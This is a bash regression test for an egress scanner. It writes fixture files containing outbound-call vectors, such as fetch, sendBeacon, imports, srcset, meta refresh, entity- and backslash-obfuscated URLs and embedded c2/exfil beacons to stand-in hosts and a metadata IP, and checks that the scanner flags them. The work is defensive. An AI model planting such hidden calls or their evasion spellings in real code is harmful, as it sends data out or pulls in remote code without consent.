#!/usr/bin/env bash
# Regression fixtures for scan-egress.sh. Builds a throwaway tree with each class the review
# flagged and asserts the scanner's exit code + that the right paths are flagged. Exit 0 = all
# pass. Every class is exercised in ISOLATION so an assertion cannot be satisfied by a coupled
# violation (review finding: the old binary test passed only because other violations existed).
#
# NOTE: this control file assembles every fixture URL from fragments at runtime, so the SHIPPED
# source carries no literal `scheme://host`, no `curl|wget|fetch(` pipe, for the integrity
# manifest classifier to flag (finding #6: test fixtures must not poison the release path). The
# throwaway tree still receives real, scannable URLs; only this source is inert.
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SCAN="$HERE/scan-egress.sh"
pass=0; fail=0
ok(){ pass=$((pass+1)); printf '  ok    %s\n' "$1"; }
no(){ fail=$((fail+1)); printf '  FAIL  %s\n' "$1"; }

T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT

# assemble scheme + '://' from fragments so no literal URL token appears in THIS file
_s='ht'; _t='tp'; _x='s'; _sep=':'; _sl='/'
J="${_sep}${_sl}${_sl}"                                          # ://  (assembled)
url_https(){ printf '%s%s%s%s%s' "$_s" "$_t" "$_x" "$J" "$1"; }  # https://<host/path>
url_http(){  printf '%s%s%s%s'   "$_s" "$_t"       "$J" "$1"; }  # http://<host/path>

# --- build the fixtures (each class isolated in its own dir) ---
mkdir -p "$T/clean" "$T/waived" "$T/dirty" "$T/binonly" "$T/binembed" "$T/symonly" "$T/nlname"

# clean: no egress at all
printf '# docs\nnothing external here\n'                          > "$T/clean/readme.md"
printf 'body{color:red}\n'                                        > "$T/clean/style.css"
printf '<svg xmlns="%s"></svg>\n' "$(url_http www.w3.org/2000/svg)" > "$T/clean/icon.svg"   # non-fetching xmlns

# waived: a real egress with a bounded trailing waiver -> passes
printf 'const u="%s"; /* egress-ok */\n' "$(url_https api.example.invalid)" > "$T/waived/app.js"

# dirty: extensionless + UPPERCASE + symlink + binary + benign, all together
printf '#!/bin/sh\ndownload %s\n' "$(url_https evil.example.invalid/x)"   > "$T/dirty/deploy"   # extensionless
chmod +x "$T/dirty/deploy"
printf '#!/bin/sh\ndownload %s\n' "$(url_http 169.254.169.254/x)"         > "$T/dirty/RUN.SH"    # UPPERCASE ext
printf 'ok\n'                                                             > "$T/dirty/note.txt"
ln -s /etc/hosts "$T/dirty/link-out"                                                             # symlink escape
printf '\x7fELF\x01\x02\x03\x00\x00binary\x00\xff\xfe'                    > "$T/dirty/blob.bin"  # benign binary

# isolation: a benign binary ALONE (proves a binary fails closed on its own, and no set -u crash)
printf '\x7fELF\x00\x01\x02\xff\xfe'                                      > "$T/binonly/only.bin"
# isolation: a binary whose STRINGS embed a URL (proves scan-egress greps binary strings)
printf 'PRE\x00%s\x00POST\n' "$(url_https c2.example.invalid/beacon)"     > "$T/binembed/embed.bin"
# isolation: a symlink ALONE (proves symlink-only input does not crash under set -u)
ln -s /etc/hosts "$T/symonly/only-link"
# isolation: a filename CONTAINING A NEWLINE with an egress (proves NUL-safe find enumeration)
printf 'x %s\n' "$(url_https nl.example.invalid/x)"                       > "$T/nlname/we"$'\n'"ird.txt"

# --- 2.0.3 self-red-team fixtures (adversarial panel) ---
mkdir -p "$T/pr_srcset" "$T/pr_poster" "$T/pr_meta" "$T/laundry" "$T/webrtc" "$T/localok" "$T/fifo" "$T/binurl"
# protocol-relative //host in browser-auto-fetched contexts (bare '//', assembled to stay inert here).
# R6 finding #4: each vector gets its OWN isolated dir so one hit can never mask another.
_j="${_sep}${_sl}${_sl}"
printf '<img srcset="%scdn.evil.invalid/a.png 2x">\n' "${_sl}${_sl}"                 > "$T/pr_srcset/i.html"
printf '<video poster="%sposter.evil.invalid/f.jpg"></video>\n' "${_sl}${_sl}"       > "$T/pr_poster/i.html"
printf '<meta http-equiv="refresh" content="0;url=%smeta.evil.invalid/next">\n' "${_sl}${_sl}" > "$T/pr_meta/i.html"
# DOCTYPE-wrapped REAL url must NOT be laundered (the old <!DOCTYPE ...> strip ate it) -> must FAIL
printf 'var a="<!doctype"; var u="%s"; var b=">";\n' "$(url_https evil.invalid/steal)" > "$T/laundry/app.js"
# WebRTC stun: scheme (inert literal — no http prefix for the manifest classifier)
printf 'new RTCPeerConnection({iceServers:[{urls:"stun:stun.evil.invalid:3478"}]});\n' > "$T/webrtc/app.js"
# same-origin / data: fetch and a README that merely NAMES the APIs are BENIGN -> must PASS
printf 'fetch("./config.json"); new XMLHttpRequest(); fetch("data:text/plain,ok");\n' > "$T/localok/app.js"
printf '# Docs\nUses the fetch() API and XMLHttpRequest for local data.\n' > "$T/localok/README.md"
# a FIFO must fail closed and NEVER be read (reading it would hang the scanner)
mkfifo "$T/fifo/pipe" 2>/dev/null || true
printf 'ok\n' > "$T/fifo/ok.txt"
# a binary carrying an embedded URL must FAIL even when glob-waived (no laundering)
printf 'PRE\x00%s\x00POST\n' "$(url_https tracker.invalid/beacon)" > "$T/binurl/tracker.bin"

# --- 2.0.3-r4 fixtures (Codex round-3 exact-head), each class ISOLATED in its own dir ---
_pr="${_sl}${_sl}"                                              # protocol-relative '//' (assembled)
mkdir -p "$T/nsfetch" "$T/nsvar" "$T/nssvg" "$T/ppm" \
         "$T/objdata" "$T/beacon" "$T/xhropen" "$T/srcset2" "$T/leadws" "$T/mlattr" "$T/mlfetch" \
         "$T/unreadbin" "$T/travtree/sub/secret"
# finding 1: xmlns must NOT launder a real fetch/variable; only a genuine in-tag xmlns is benign
printf 'fetch(xmlns="%s")\n' "$(url_https exfil.invalid/x)"           > "$T/nsfetch/app.js"
printf 'const xmlns="%s"; fetch(xmlns)\n' "$(url_https exfil.invalid/y)" > "$T/nsvar/app.js"
printf '<svg xmlns="%s"></svg>\n' "$(url_http www.w3.org/2000/svg)"   > "$T/nssvg/icon.svg"
# finding 4: a NUL-free P6 Netpbm rawbits binary (control bytes, no NUL) must classify BINARY
{ printf 'P6\n2 2\n255\n'; printf '\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c'; } > "$T/ppm/img.ppm"
# finding 5: protocol-relative //host in each fetching context claimed by SKILL.md, isolated
printf '<object data="%sevil.invalid/x.swf"></object>\n' "$_pr"       > "$T/objdata/i.html"
printf 'navigator.sendBeacon("%sevil.invalid/b");\n' "$_pr"           > "$T/beacon/a.js"
printf 'var x=new XMLHttpRequest(); x.open("GET","%sevil.invalid/d");\n' "$_pr" > "$T/xhropen/a.js"
printf '<img srcset="%sa.invalid/1.png 1x, %sb.invalid/2.png 2x">\n' "$_pr" "$_pr" > "$T/srcset2/i.html"
mkdir -p "$T/srcset_a" "$T/srcset_b"                          # R6 #4: each candidate ALSO isolated alone
printf '<img srcset="%ssa.invalid/1.png 1x">\n' "$_pr"                > "$T/srcset_a/i.html"
printf '<img srcset="%ssb.invalid/2.png 2x">\n' "$_pr"                > "$T/srcset_b/i.html"
printf '<a href=" %sevil.invalid/lead">x</a>\n' "$_pr"               > "$T/leadws/i.html"
printf '<img\n  src\n  ="%sevil.invalid/ml">\n' "$_pr"               > "$T/mlattr/i.html"   # multiline attr
printf 'fetch(\n  "%sevil.invalid/mlf")\n' "$_pr"                    > "$T/mlfetch/a.js"    # multiline literal
# finding 2 & 3: unreadable file / traversal error fixtures (chmod applied at check time, root-skipped)
printf 'PRE\x00%s\x00POST\n' "$(url_https c2.invalid/x)"             > "$T/unreadbin/font.woff2"
printf 'clean docs\n'                                                > "$T/travtree/visible.txt"
printf 'download %s\n' "$(url_https evil.invalid/x)"                 > "$T/travtree/sub/secret/hidden.sh"

# --- 2.0.3-r5 fixtures (Codex round-4 exact-head), each class ISOLATED in its own dir ---
# shellcheck disable=SC1003  # not an escaped quote: exactly two literal backslash characters
_bs='\\'
mkdir -p "$T/latenul" "$T/ipv6" "$T/esmod" "$T/expfrom" "$T/btfetch" "$T/worker" "$T/swreg" \
         "$T/locnav" "$T/bslash" "$T/jsprop" "$T/fpsrc" "$T/fpdata" "$T/fpdiv"
# finding 1: text-classified file (first 8K printable) with a LATE NUL + real URL — the NUL must not
# be able to collapse the counts channel into a false PASS (counts ride a separate trusted file)
head -c 9000 /dev/zero | LC_ALL=C tr '\0' 'A'                        > "$T/latenul/late.js"
printf '\000%s\n' "$(url_https exfil.invalid/steal)"                >> "$T/latenul/late.js"
# finding 7: each direct-miss vector isolated
printf '<img src="%s[2001:db8::1]/x.png">\n' "$_pr"                  > "$T/ipv6/i.html"      # IPv6 literal host
printf 'import x from "%sevil.invalid/mod.js";\n' "$_pr"             > "$T/esmod/a.js"       # static import
printf 'export { a } from "%sevil.invalid/re.js";\n' "$_pr"          > "$T/expfrom/a.js"     # export-from
# shellcheck disable=SC2016  # the backticks are JS template-literal SYNTAX and must stay literal
printf 'fetch(`%sevil.invalid/bt`);\n' "$_pr"                        > "$T/btfetch/a.js"     # backtick template
printf 'new Worker("%sevil.invalid/w.js");\n' "$_pr"                 > "$T/worker/a.js"      # dedicated worker
printf 'navigator.serviceWorker.register("%sevil.invalid/sw.js");\n' "$_pr" > "$T/swreg/a.js"
printf 'location.assign("%sevil.invalid/nav");\n' "$_pr"             > "$T/locnav/a.js"
printf '<a href="%s%s%s%s%sevil.invalid/bs">x</a>\n' "$_s" "$_t" "$_x" "$_sep" "$_bs" > "$T/bslash/i.html"  # https:\\host
# tag-bounding must NOT lose the JS property-assignment vector (dot-prefixed .src=)
printf 'img.src = "%sevil.invalid/js";\n' "$_pr"                     > "$T/jsprop/a.js"
# finding 8: material false positives — plain JS vars and a non-fetching div data attribute
printf "const src='%sdocs';\n" "$_pr"                                > "$T/fpsrc/a.js"
printf "const data='%sdocs';\n" "$_pr"                               > "$T/fpdata/a.js"
printf "<div data='%sdocs'>x</div>\n" "$_pr"                         > "$T/fpdiv/i.html"
# nearby FP found while red-teaming: BOTH xmlns declarations in one tag are benign namespaces
mkdir -p "$T/ns2"
printf '<svg xmlns="%s" xmlns:xlink="%s"></svg>\n' \
  "$(url_http www.w3.org/2000/svg)" "$(url_http www.w3.org/1999/xlink)" > "$T/ns2/i.svg"

# --- 2.0.3-r6 fixtures (Codex round-5 exact-head), each class ISOLATED ---
# finding S2: valid COMPACT ES modules (no whitespace after the keyword) must be caught
mkdir -p "$T/r6imp" "$T/r6exp" "$T/r6star" "$T/r6bare" "$T/r6konst"
printf 'import{a}from"%sevil.invalid/m"\n' "$_pr"                     > "$T/r6imp/a.js"     # import{a}from
printf 'export{a}from"%sevil.invalid/m"\n' "$_pr"                     > "$T/r6exp/a.js"     # export{a}from
printf 'import*as n from"%sevil.invalid/m"\n' "$_pr"                  > "$T/r6star/a.js"    # import*as
printf 'import"%sevil.invalid/side"\n' "$_pr"                         > "$T/r6bare/a.js"    # bare import"//h"
printf 'export const x = "%sdocs";\n' "$_pr"                          > "$T/r6konst/a.js"   # string const, NOT a fetch
# finding S3: a filename carrying an ESC + forged text must be sanitized in every diagnostic
mkdir -p "$T/r6esc"
ln -s /etc/hosts "$T/r6esc/$(printf 'evil\033[32mFORGED-PASS\033[0m')" 2>/dev/null || true

# --- 2.0.3-r7 fixtures (scanner attack-matrix), each class ISOLATED ---
# WHATWG network-path spellings: three slashes, mixed slash/backslash, percent-decoded host, and
# userinfo all resolve to an external authority. The percent-encoded slash control is an invalid
# host and must stay clean. `_bs` is two source backslashes (one runtime JS backslash).
mkdir -p "$T/r7triple" "$T/r7pcthost" "$T/r7userinfo0" "$T/r7userinfo1" \
         "$T/r7mix3" "$T/r7mix2" "$T/r7badpct" "$T/r7hyphenhost" \
         "$T/r7underhost" "$T/r7pctuserinfo"
printf 'fetch("%s%s%sevil.invalid/x")\n' "$_sl" "$_sl" "$_sl" > "$T/r7triple/a.js"
printf 'fetch("%s%s%%65vil.invalid/x")\n' "$_sl" "$_sl"       > "$T/r7pcthost/a.js"
printf 'fetch("%s%s@evil.invalid/x")\n' "$_sl" "$_sl"        > "$T/r7userinfo0/a.js"
printf 'fetch("%s%s:pw@evil.invalid/x")\n' "$_sl" "$_sl"     > "$T/r7userinfo1/a.js"
printf 'fetch("%s%s%sevil.invalid/x")\n' "$_sl" "$_sl" "$_bs" > "$T/r7mix3/a.js"
printf 'fetch("%s%sevil.invalid/x")\n' "$_sl" "$_bs"        > "$T/r7mix2/a.js"
printf 'fetch("%s%s%%2fevil.invalid/x")\n' "$_sl" "$_sl"     > "$T/r7badpct/a.js"
printf 'fetch("%s%s-evil.invalid/x")\n' "$_sl" "$_sl"       > "$T/r7hyphenhost/a.js"
printf 'fetch("%s%s_evil.invalid/x")\n' "$_sl" "$_sl"       > "$T/r7underhost/a.js"
printf 'fetch("%s%su%%2F:p@evil.invalid/x")\n' "$_sl" "$_sl" > "$T/r7pctuserinfo/a.js"

# HTML character references are decoded exactly once in fetching attributes. Each decoded output
# carries a raw-source offset so findings, line waivers, and two-candidate counts remain exact.
mkdir -p "$T/r7enthex" "$T/r7entdec" "$T/r7entnamed" "$T/r7entabs" \
         "$T/r7entsrcset" "$T/r7entmeta" "$T/r7entcss" "$T/r7enttitle" \
         "$T/r7entdouble" "$T/r7entjs" "$T/r7escaped" "$T/r7entwaive"
printf '<img src="&#x2f;&#x2f;evil.invalid/x">\n'              > "$T/r7enthex/i.html"
printf '<img src="&#47;&#47;evil.invalid/x">\n'                  > "$T/r7entdec/i.html"
printf '<img src="&sol;&sol;evil.invalid/x">\n'                  > "$T/r7entnamed/i.html"
printf '<img src="https&colon;&sol;&sol;evil.invalid/x">\n'      > "$T/r7entabs/i.html"
printf '<img srcset="&sol;&sol;a.invalid/1.png 1x, &sol;&sol;b.invalid/2.png 2x">\n' > "$T/r7entsrcset/i.html"
printf '<meta http-equiv="refresh" content="0;url=&sol;&sol;evil.invalid/next">\n' > "$T/r7entmeta/i.html"
printf '<div style="background:url(&sol;&sol;evil.invalid/bg.png)"></div>\n' > "$T/r7entcss/i.html"
printf '<div title="&sol;&sol;docs.invalid/title">text</div>\n'  > "$T/r7enttitle/i.html"
printf '<img src="&amp;#47;&amp;#47;docs.invalid/not-network">\n' > "$T/r7entdouble/i.html"
printf '<script>fetch("&sol;&sol;docs.invalid/not-decoded")</script>\n' > "$T/r7entjs/i.html"
printf '&lt;img src=&quot;&sol;&sol;docs.invalid/not-markup&quot;&gt;\n' > "$T/r7escaped/i.html"
printf '<img src="&sol;&sol;reviewed.invalid/x"> /* egress-ok */\n' > "$T/r7entwaive/i.html"

# JS grammar: comments may surround tokens, but commented-out/code-shaped text is inert. Bracket
# location, window.open, and DOM attribute setters are fetching APIs; unrelated db.open/new URL are not.
mkdir -p "$T/r7fetchcomment" "$T/r7importcomment" "$T/r7exportcomment" "$T/r7importclause" \
         "$T/r7locbracket" "$T/r7windowopen" "$T/r7setsrc" "$T/r7sethrefns" \
         "$T/r7setsrcset" "$T/r7setaction" "$T/r7setformaction" "$T/r7linecomment" \
         "$T/r7blockcomment" "$T/r7htmlcomment" "$T/r7codestring" "$T/r7urlcomment" \
         "$T/r7plaintriple" "$T/r7newurl" "$T/r7dbopen" "$T/r7hashlocal" \
         "$T/r7cssurl" "$T/r7csscomment" "$T/r7prosescript" "$T/r7markwstring"
mkdir -p "$T/r7optional" "$T/r7bracketfetch" "$T/r7localdouble" "$T/r7jsmarkup" "$T/r7bodycode" \
         "$T/r7winloc" "$T/r7docloc" "$T/r7bracketloc" "$T/r7srcdoc"
mkdir -p "$T/r7ping2"
mkdir -p "$T/r7image2"
mkdir -p "$T/r7brackethref"
mkdir -p "$T/r7quotehost" "$T/r7banghost" "$T/r7unclosedscript" "$T/r7unclosedstyle" "$T/r7srcdocunclosed"
printf 'fetch/* audit */("%sevil.invalid/x")\n' "$_pr" > "$T/r7fetchcomment/a.js"
printf 'import/* audit */"%sevil.invalid/side.js"\n' "$_pr" > "$T/r7importcomment/a.js"
printf 'export/* a */{x}/* b */from/* c */"%sevil.invalid/mod.js"\n' "$_pr" > "$T/r7exportcomment/a.js"
printf 'import/* a */{x as y, z}/* b */from/* c */"%sevil.invalid/full.js"\n' "$_pr" > "$T/r7importclause/a.js"
printf 'location["href"]="%sevil.invalid/nav"\n' "$_pr" > "$T/r7locbracket/a.js"
printf 'window.open("%sevil.invalid/popup")\n' "$_pr" > "$T/r7windowopen/a.js"
printf 'document.querySelector("img").setAttribute("src","%sevil.invalid/i.png")\n' "$_pr" > "$T/r7setsrc/a.js"
printf 'node.setAttributeNS(null,"href","%sevil.invalid/x")\n' "$_pr" > "$T/r7sethrefns/a.js"
printf 'node.setAttribute("srcset","%sa.invalid/1.png 1x, %sb.invalid/2.png 2x")\n' "$_pr" "$_pr" > "$T/r7setsrcset/a.js"
printf 'form.setAttribute("action","%sevil.invalid/post")\n' "$_pr" > "$T/r7setaction/a.js"
printf 'button.setAttribute("formaction","%sevil.invalid/post")\n' "$_pr" > "$T/r7setformaction/a.js"
printf '// fetch("%sdocs.invalid/comment")\nconst x=1;\n' "$_pr" > "$T/r7linecomment/a.js"
printf '/* import "%sdocs.invalid/comment" */\nconst x=1;\n' "$_pr" > "$T/r7blockcomment/a.js"
printf '<!-- <img src="%sdocs.invalid/comment"> -->\n<p>ok</p>\n' "$_pr" > "$T/r7htmlcomment/i.html"
printf "const sample='fetch(\"%sdocs.invalid/example\")';\n" "$_pr" > "$T/r7codestring/a.js"
printf 'fetch("%sevil.invalid/a/*still-url*/b")\n' "$_pr" > "$T/r7urlcomment/a.js"
printf 'const docs="%s%s%sdocs";\n' "$_sl" "$_sl" "$_sl" > "$T/r7plaintriple/a.js"
printf 'const u=new URL("%sdocs.invalid/path", location.href);\n' "$_pr" > "$T/r7newurl/a.js"
printf 'db.open("%sdocs.invalid/database")\n' "$_pr" > "$T/r7dbopen/a.js"
printf '<a href="#part">x</a><img src="/local.png"><div title="%sdocs">t</div>\n' "$_pr" > "$T/r7hashlocal/i.html"
printf 'body{background:url(%sevil.invalid/bg.png)}\n' "$_pr" > "$T/r7cssurl/a.css"
printf '/* body{background:url(%sdocs.invalid/comment.png)} */\n' "$_pr" > "$T/r7csscomment/a.css"
printf "<p>don't mask this:</p><script>fetch(\"%sevil.invalid/live\")</script>\n" "$_pr" > "$T/r7prosescript/i.html"
printf "<script>const sample='<img src=\"%sdocs.invalid/example\">';</script>\n" "$_pr" > "$T/r7markwstring/i.html"
printf 'fetch?.("%sevil.invalid/optional")\n' "$_pr" > "$T/r7optional/a.js"
printf 'window["fetch"]("%sevil.invalid/bracket")\n' "$_pr" > "$T/r7bracketfetch/a.js"
printf 'fetch("/api/%ssame-origin/path")\n' "$_pr" > "$T/r7localdouble/a.js"
printf "const sample='<img src=\"%sdocs.invalid/example\">';\n" "$_pr" > "$T/r7jsmarkup/a.js"
printf '<p>Example: fetch("%sdocs.invalid/example")</p>\n' "$_pr" > "$T/r7bodycode/i.html"
printf 'window.location="%sevil.invalid/window"\n' "$_pr" > "$T/r7winloc/a.js"
printf 'document.location="%sevil.invalid/document"\n' "$_pr" > "$T/r7docloc/a.js"
printf 'window["location"]="%sevil.invalid/bracket-location"\n' "$_pr" > "$T/r7bracketloc/a.js"
printf '<iframe srcdoc="&lt;img src=&quot;%sevil.invalid/nested&quot;&gt;"></iframe>\n' "$_pr" > "$T/r7srcdoc/i.html"
printf '<a ping="%sa.invalid/p %sb.invalid/p">x</a>\n' "$_pr" "$_pr" > "$T/r7ping2/i.html"
printf 'body{background-image:image-set("%sa.invalid/1.png" 1x, "%sb.invalid/2.png" 2x)}\n' "$_pr" "$_pr" > "$T/r7image2/a.css"
printf 'window["location"]["href"]="%sevil.invalid/chained"\n' "$_pr" > "$T/r7brackethref/a.js"
printf 'fetch("%s\047evil.invalid/punct")\n' "$_pr" > "$T/r7quotehost/a.js"
printf 'fetch("%s!evil.invalid/punct")\n' "$_pr" > "$T/r7banghost/a.js"
printf '<script>fetch("%sevil.invalid/unclosed")\n' "$_pr" > "$T/r7unclosedscript/i.html"
printf '<style>body{background:url(%sevil.invalid/unclosed)}\n' "$_pr" > "$T/r7unclosedstyle/i.html"
printf '<iframe srcdoc="&lt;script&gt;fetch(&quot;%sevil.invalid/nested-unclosed&quot;)"></iframe>\n' "$_pr" > "$T/r7srcdocunclosed/i.html"

check() { # <label> <want-exit> <needle-or-empty> -- <scan args...>
  local label="$1" want="$2" needle="$3"; shift 3
  local out got
  out="$(bash "$SCAN" "$@" 2>&1)"; got=$?
  if [ "$got" != "$want" ]; then no "$label (exit want=$want got=$got)"; return; fi
  if [ -n "$needle" ] && ! printf '%s' "$out" | grep -q -- "$needle"; then no "$label (missing '$needle')"; return; fi
  ok "$label"
}

check_count() { # <label> <want-exit> <want-EGRESS-line-count> -- <scan args...>
  # asserts the EXACT number of EGRESS records, so on a multi-candidate line one detected hit can
  # never mask a missed sibling (R6 finding #4).
  local label="$1" want="$2" wantc="$3"; shift 3
  local out got cnt
  out="$(bash "$SCAN" "$@" 2>&1)"; got=$?
  cnt="$(printf '%s\n' "$out" | grep -c '^EGRESS ')"
  if [ "$got" != "$want" ]; then no "$label (exit want=$want got=$got)"; return; fi
  if [ "$cnt" != "$wantc" ]; then no "$label (EGRESS count want=$wantc got=$cnt)"; return; fi
  ok "$label"
}

echo "== scan-egress regressions =="
check "clean tree passes"                       0 ""                  "$T/clean"
check "non-fetching xmlns is not egress"        0 "NSURI"             "$T/clean"
check "waived text passes"                      0 "WAIVED"            "$T/waived"
check "extensionless script detected"           1 "deploy"            "$T/dirty"
check "UPPERCASE .SH detected"                  1 "RUN.SH"            "$T/dirty"
check "symlink flagged"                         1 "SYMLINK"           "$T/dirty"
check "binary fails closed in isolation"        1 "UNSCANNED(binary)" "$T/binonly"
check "binary-only no set -u crash"             1 "only.bin"          "$T/binonly"
check "symlink-only no set -u crash"            1 "SYMLINK"           "$T/symonly"
check "binary embedded URL is scanned + fails"  1 "EGRESS(binary)"    "$T/binembed"
check "newline-in-filename still enumerated"    1 "EGRESS"            "$T/nlname"
check "binary waived by --allow-binary passes"  0 "WAIVED-BINARY"     --allow-binary '*only.bin' "$T/binonly"
check "unmatched --allow-binary still fails"    1 "UNSCANNED(binary)" --allow-binary '*.png' "$T/binonly"

echo "== 2.0.3 self-red-team (adversarial panel) =="
check "protocol-relative srcset fails (isolated)" 1 "cdn.evil.invalid"  "$T/pr_srcset"
check "protocol-relative poster fails (isolated)" 1 "poster.evil.invalid" "$T/pr_poster"
check "meta-refresh protocol-relative fails"     1 "meta.evil.invalid" "$T/pr_meta"
check "DOCTYPE wrapper does not launder a URL"   1 "EGRESS"            "$T/laundry"
check "WebRTC stun: scheme detected"             1 "EGRESS"            "$T/webrtc"
check "same-origin/data fetch + README pass"     0 ""                 "$T/localok"
check "FIFO in dir fails closed (no hang)"        1 "SPECIAL"           "$T/fifo"
check "direct FIFO target fails closed"          1 "SPECIAL"           "$T/fifo/pipe"
check "embedded-URL binary fails even if waived" 1 "EGRESS(binary)"    --allow-binary '*' "$T/binurl"

echo "== 2.0.3-r4 (Codex round-3 exact-head) =="
check "xmlns cannot launder a real fetch()"      1 "EGRESS"            "$T/nsfetch"
check "xmlns variable is real egress"            1 "EGRESS"            "$T/nsvar"
check "genuine in-tag xmlns still benign"        0 "NSURI"             "$T/nssvg"
check "NUL-free P6 rawbits classified binary"    1 "UNSCANNED(binary)" "$T/ppm"
check "object data protocol-relative fails"      1 "EGRESS"            "$T/objdata"
check "navigator.sendBeacon fails"               1 "EGRESS"            "$T/beacon"
check "XHR.open URL argument fails"              1 "EGRESS"            "$T/xhropen"
check_count "both srcset candidates flagged (count==2)" 1 2            "$T/srcset2"
check "srcset candidate A isolated fails"        1 "sa.invalid/1.png"  "$T/srcset_a"
check "srcset candidate B isolated fails"        1 "sb.invalid/2.png"  "$T/srcset_b"
check "leading whitespace in quoted attr fails"  1 "EGRESS"            "$T/leadws"
check "multiline attribute fails"                1 "EGRESS"            "$T/mlattr"
check "multiline fetch literal fails"            1 "EGRESS"            "$T/mlfetch"
echo "== 2.0.3-r5 (Codex round-4 exact-head) =="
check "late NUL cannot collapse the counts channel" 1 "EGRESS"       "$T/latenul"
check "protocol-relative IPv6 literal host fails"   1 "EGRESS"       "$T/ipv6"
check "static import from external fails"           1 "EGRESS"       "$T/esmod"
check "export-from external fails"                  1 "EGRESS"       "$T/expfrom"
check "backtick-template fetch fails"               1 "EGRESS"       "$T/btfetch"
check "new Worker external script fails"            1 "EGRESS"       "$T/worker"
check "serviceWorker.register fails"                1 "EGRESS"       "$T/swreg"
check "location.assign navigation fails"            1 "EGRESS"       "$T/locnav"
check "backslash-normalized https URL fails"        1 "EGRESS"       "$T/bslash"
check "dot-prefixed .src property still fails"      1 "EGRESS"       "$T/jsprop"
check "plain JS src variable is not egress"         0 ""             "$T/fpsrc"
check "plain JS data variable is not egress"        0 ""             "$T/fpdata"
check "div data attribute is not egress"            0 ""             "$T/fpdiv"
check "second xmlns in one tag is still benign"     0 "NSURI"        "$T/ns2"
# unreadable file / traversal error can only be simulated as non-root
if [ "$(id -u)" -ne 0 ]; then
  chmod 000 "$T/unreadbin/font.woff2"
  check "unreadable URL-binary fails despite waiver" 1 "UNREADABLE" --allow-binary '*.woff2' "$T/unreadbin"
  chmod 644 "$T/unreadbin/font.woff2"
  chmod 000 "$T/travtree/sub/secret"
  check "traversal error fails the tree closed"      1 "TRAVERSAL"  "$T/travtree"
  chmod 755 "$T/travtree/sub/secret"
else
  printf '  skip  unreadable-file + traversal (running as root — cannot simulate unreadable)\n'
fi

echo "== 2.0.3-r6 (Codex round-5 exact-head) =="
# S2: compact ES module forms are caught; a string constant with no `from` stays clean
check "compact import{a}from is caught"          1 "EGRESS"       "$T/r6imp"
check "compact export{a}from is caught"          1 "EGRESS"       "$T/r6exp"
check "compact import*as ... from is caught"     1 "EGRESS"       "$T/r6star"
check "bare side-effect import is caught"        1 "EGRESS"       "$T/r6bare"
check "export const string is NOT egress"        0 ""             "$T/r6konst"
# S3: an ESC-bearing filename must appear neutralized (no raw ESC byte) in the diagnostic
r6esc_out="$(bash "$SCAN" "$T/r6esc" 2>&1)"
if printf '%s' "$r6esc_out" | LC_ALL=C grep -q "$(printf '\033')"; then
  no "S3 control byte in path is sanitized (raw ESC leaked)"
else
  ok "S3 control byte in path is sanitized (raw ESC leaked)"
fi
# S3 also: the sanitized diagnostic still visibly reports the symlink with '?' placeholders
if printf '%s' "$r6esc_out" | grep -q 'SYMLINK .*FORGED-PASS'; then
  ok "S3 sanitized SYMLINK still shown"
else
  no "S3 sanitized SYMLINK still shown"
fi

echo "== 2.0.3-r7 (scanner attack-matrix) =="
check "WHATWG triple-slash authority is caught"       1 "EGRESS" "$T/r7triple"
check "WHATWG percent-decoded host is caught"         1 "EGRESS" "$T/r7pcthost"
check "WHATWG empty-userinfo authority is caught"     1 "EGRESS" "$T/r7userinfo0"
check "WHATWG password-userinfo authority is caught"  1 "EGRESS" "$T/r7userinfo1"
check "WHATWG slash-slash-backslash is caught"        1 "EGRESS" "$T/r7mix3"
check "WHATWG slash-backslash authority is caught"    1 "EGRESS" "$T/r7mix2"
check "percent-encoded slash host is invalid, not egress" 0 ""    "$T/r7badpct"
check_count "leading-hyphen WHATWG host count==1"        1 1     "$T/r7hyphenhost"
check_count "leading-underscore WHATWG host count==1"    1 1     "$T/r7underhost"
check_count "percent-encoded userinfo cannot hide host"  1 1     "$T/r7pctuserinfo"

check "hex HTML entities in src are caught"           1 "EGRESS" "$T/r7enthex"
check "decimal HTML entities in src are caught"       1 "EGRESS" "$T/r7entdec"
check "named HTML entities in src are caught"         1 "EGRESS" "$T/r7entnamed"
check_count "entity-encoded absolute URL count==1"    1 1        "$T/r7entabs"
check_count "entity srcset candidates count==2"       1 2        "$T/r7entsrcset"
check "entity meta-refresh URL is caught"             1 "EGRESS" "$T/r7entmeta"
check "entity inline-CSS URL is caught"               1 "EGRESS" "$T/r7entcss"
check "entity in non-fetching title stays clean"      0 ""       "$T/r7enttitle"
check "double-encoded entity is decoded only once"    0 ""       "$T/r7entdouble"
check "entity in script is not HTML-decoded"          0 ""       "$T/r7entjs"
check "escaped markup stays ordinary text"            0 ""       "$T/r7escaped"
check "entity finding keeps source-line waiver"       0 "WAIVED" "$T/r7entwaive"

check "comment between fetch and call cannot hide it" 1 "EGRESS" "$T/r7fetchcomment"
check "commented bare import is still caught"         1 "EGRESS" "$T/r7importcomment"
check "comments around export/from are still caught"  1 "EGRESS" "$T/r7exportcomment"
check "comments around full import clause are caught" 1 "EGRESS" "$T/r7importclause"
check "bracket location href navigation is caught"    1 "EGRESS" "$T/r7locbracket"
check "window.open navigation is caught"              1 "EGRESS" "$T/r7windowopen"
check "setAttribute src is caught"                    1 "EGRESS" "$T/r7setsrc"
check "setAttributeNS href is caught"                 1 "EGRESS" "$T/r7sethrefns"
check_count "setAttribute srcset candidates count==2" 1 2        "$T/r7setsrcset"
check "setAttribute action is caught"                 1 "EGRESS" "$T/r7setaction"
check "setAttribute formaction is caught"             1 "EGRESS" "$T/r7setformaction"

check "JS line-commented call stays clean"            0 ""       "$T/r7linecomment"
check "JS block-commented module stays clean"         0 ""       "$T/r7blockcomment"
check "HTML-commented markup stays clean"             0 ""       "$T/r7htmlcomment"
check "code-shaped ordinary string stays clean"       0 ""       "$T/r7codestring"
check "comment marker inside real URL still blocks"   1 "EGRESS" "$T/r7urlcomment"
check "plain triple-slash JS variable stays clean"    0 ""       "$T/r7plaintriple"
check "new URL construction alone stays clean"        0 ""       "$T/r7newurl"
check "unrelated db.open stays clean"                 0 ""       "$T/r7dbopen"
check "hash/local/title controls stay clean"          0 ""       "$T/r7hashlocal"
check "real CSS url() still blocks"                   1 "EGRESS" "$T/r7cssurl"
check "CSS-commented url() stays clean"               0 ""       "$T/r7csscomment"
check "prose quote cannot mask live script body"      1 "EGRESS" "$T/r7prosescript"
